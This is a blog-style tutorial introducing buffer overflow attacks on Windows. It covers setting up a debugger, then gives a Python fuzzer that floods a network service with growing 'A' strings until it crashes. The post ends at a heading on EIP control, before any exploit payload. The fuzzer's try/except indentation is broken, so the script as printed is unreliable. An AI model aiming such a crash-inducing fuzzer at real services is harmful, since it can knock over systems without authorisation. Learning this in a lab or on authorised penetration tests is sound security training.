---
layout: post
title: Buffer Overflow Overview
author: Mitchell Stein
tags:
- jekyll theme
- jekyll
date: 2021-11-02
tags: [buffer overflow, general, windows]
categories: [Tools]
toc:  true
---

Buffer overflows are a must have for any penetration testers arsenal.

To perform a buffer overflow attack, some setup is needed for it to be effective and to not crash any production or business critical applications.

## Setup

First off, If possible you must download a copy of the vulnerable application to your own testing machine running your choice of debugging program. For this example we will use [Immunity Debugger](https://www.immunityinc.com/products/debugger/) along with an additional script add-on called [Mona.py](https://github.com/corelan/mona).

![Immunity Debugger with Mona.py](https://mitchelldstein.github.io/assets/images/BufferOverflow/ImmunityDebugger.png)

## Fuzzing

Fuzzing is the process of finding errors and security flaws in software or networks. Fuzzing for buffer overflows involved sending larger and larger commands into the program in hopes to crash it and log the length of the command.

Here is a fuzzer made in python that will interact with the running application and log the length of the command sent.

**_fuzzer.py:_**

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "MACHINE_IP"

port = 1337
timeout = 5
prefix = "<cmd if needed>"

string = prefix + "A" * 100

while True:
    try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
        s.send(bytes(string, "latin-1"))
        s.recv(1024)
    except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
    string += 100 * "A"
    time.sleep(1)
```

Run this command against the network facing program and log the number of bytes it crashed at. As a good rule of thumb always add +400 to the crashed bytes.

## Crash Replication & EIP Control
